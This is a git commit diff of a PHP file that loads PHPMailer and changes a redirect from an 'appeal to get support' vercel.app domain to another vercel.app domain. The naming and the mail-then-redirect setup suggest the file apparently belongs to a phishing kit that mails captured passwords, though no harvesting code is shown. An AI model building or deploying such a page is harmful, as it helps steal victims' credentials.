a45dc782c3513a1eb1520be290b52b7939806f55
asif1012-lgtm <hpboost8@gmail.com>
2025-07-22 15:23:47 +0500

    Update zubair5.php

--- zubair5.php
+++ zubair5.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://send-an-appeal-to-get-support-pass.vercel.app/");
+header("Location:https://zubair5pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
